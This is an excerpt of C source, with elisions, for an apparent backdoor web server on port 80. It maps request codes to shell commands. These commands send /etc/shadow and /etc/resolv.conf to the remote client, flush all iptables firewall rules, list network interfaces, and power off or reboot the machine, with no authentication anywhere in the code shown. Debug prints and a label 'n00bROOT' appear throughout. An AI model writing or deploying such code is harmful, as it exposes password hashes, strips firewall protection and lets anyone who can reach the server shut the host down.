...
main()
{
	...
	if(pipe(restore_pfds) == -1){                    
		system("echo 'IPC error' >> zerror.log");
		perror("server: restore_pfds FlaW");           
		exit(1);                                 
	} 
	...
	server.sin_port = htons(80);   /* Remember htons() from "Conversions" section? =) */
	...
	while(1){
		...
		{
			Request[numbytes]='\0';
printf("jean_debug(%d):%s:Request=%s\n",__LINE__,__PRETTY_FUNCTION__,Request);
...
printf("jean_debug(%d):%s:axnCode=%d\n",__LINE__,__PRETTY_FUNCTION__,axnCode);
	dup2(STDOUT,restore_pfds[STDOUT]);// stdout assign to pipe stream();
	dup2(pfds[STDOUT],STDOUT);// stdout assign to pipe stream();
	
	//close(1);
	switch(axnCode){
		//default case
		case -1: httpResponse_code=200;
				system("echo \"<br/><br/><i>n00bROOT</i>\"");	break;
		//hangs the TuX machine
		case 0:	httpResponse_code=200;			
		...
		case 2:		httpResponse_code=200;
				system("echo \'/etc/shadow Listing:   \' | cat /etc/shadow");	break;
		//all entries of /etc/resolv.conf
		case 3:		httpResponse_code=200;
				system("echo \'/etc/resolv.conf Listing:   \' | cat /etc/resolv.conf");	break;
		//prints entire dynamic memory
		case 4:		httpResponse_code=200;
				printf("jean_debug(%d):%s:will hang remove it\n",__LINE__,__PRETTY_FUNCTION__);
				//system("echo \'/dev/mem Listing:   \' | cat /dev/mem");	break;
		//deletes all entries of IPTABLES (Firewall)
		case 5:		httpResponse_code=200;
				system("iptables --flush | echo \'IPTables Entries Deleted\'");	break;
		//all information of all NICs
		case 6:		httpResponse_code=200;
				system("echo \'ifconfig-a Listing:   \' | ifconfig -a");	break;
		//System Coded Info of all NICs
		case 7:		httpResponse_code=200;
				system("echo \'ifconfig-s Listing:   \' | ifconfig -s");	break;
		//PowerOff
		case 8:		httpResponse_code=200;
				system("poweroff");	break;
		//Reboot
		case 9:		httpResponse_code=200;
				system("reboot");	break;
		//default case
		default:	httpResponse_code=400;
				system("echo \"HTTP 404\"");	break;
	}
	read(pfds[0], buf, MAXSTRSIZE); //read the output back to buffer
	dup2(restore_pfds[STDOUT],STDOUT);// stdout assign to pipe stream();
printf("jean_debug(%d):%s:buf=%s\n",__LINE__,__PRETTY_FUNCTION__,buf);

	if (httpResponse_code ==200){ //build success httpResponce code, 
		strncat(tmpBuf,httpResponse200_part1,strlen(httpResponse200_part1));		
		total_strlen= strlen(httpResponse200_part1) +5 + strlen(httpResponse200_part2)+ strlen(buf)+strlen(httpResponse200_part3);
		sprintf(cLBuf,"%d ",total_strlen);
		strncat(tmpBuf,cLBuf,strlen(cLBuf));
		strncat(tmpBuf,httpResponse200_part2,strlen(httpResponse200_part2));		
		strncat(tmpBuf,buf,strlen(buf));
		strncat(tmpBuf,httpResponse200_part3,strlen(httpResponse200_part3));		
	}
	else {//not fixed yet
		strncat(tmpBuf,httpResponse400_part1,strlen(httpResponse400_part1));		
		total_strlen= strlen(httpResponse400_part1) +5 + strlen(httpResponse400_part2)+ strlen(buf)+strlen(httpResponse400_part3);
		sprintf(cLBuf,"%d ",total_strlen);
		strncat(tmpBuf,cLBuf,strlen(cLBuf));
		strncat(tmpBuf,httpResponse400_part2,strlen(httpResponse400_part2));		
		strncat(tmpBuf,buf,strlen(buf));
		strncat(tmpBuf,httpResponse400_part3,strlen(httpResponse400_part3));	
	}

printf("jean_debug(%d):%s:after append tmpBuf=%s\n",__LINE__,__PRETTY_FUNCTION__,tmpBuf);
	send(fd2,tmpBuf,(strlen(tmpBuf)),0);
//	send(fd2,tmpBuf,(strlen(httpResponse)),0);
	return;
}
